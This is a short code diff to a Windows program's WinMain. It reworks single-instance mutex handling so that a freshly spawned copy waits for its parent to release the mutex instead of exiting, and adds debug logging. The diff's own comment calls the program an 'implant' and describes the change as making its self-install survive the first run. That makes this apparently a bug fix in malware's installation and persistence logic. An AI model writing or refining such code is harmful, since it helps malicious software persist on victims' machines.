@@ -290,10 +290,22 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     HANDLE hGlobalMutex = nullptr;
     {
         std::wstring mutexName = BuildMutexName();
+        DBG("WinMain: acquiring mutex");
         hGlobalMutex = CreateMutexW(NULL, TRUE, mutexName.c_str());
         if (GetLastError() == ERROR_ALREADY_EXISTS) {
-            if (hGlobalMutex) CloseHandle(hGlobalMutex);
-            return 0;
+            DBG("mutex already exists — waiting for handoff");
+            // Self-install handoff: the parent that spawned us still owns the
+            // mutex for a moment before it exits. Wait for it instead of
+            // bailing — otherwise the freshly installed copy kills itself and
+            // the implant never survives its first run.
+            DWORD w = WaitForSingleObject(hGlobalMutex, 20000);
+            DBG("mutex wait result=%lu", w);
+            if (w != WAIT_OBJECT_0) {
+                // A genuinely running instance holds it — second copy, exit.
+                DBG("second instance, exiting");
+                if (hGlobalMutex) CloseHandle(hGlobalMutex);
+                return 0;
+            }
         }
     }
 
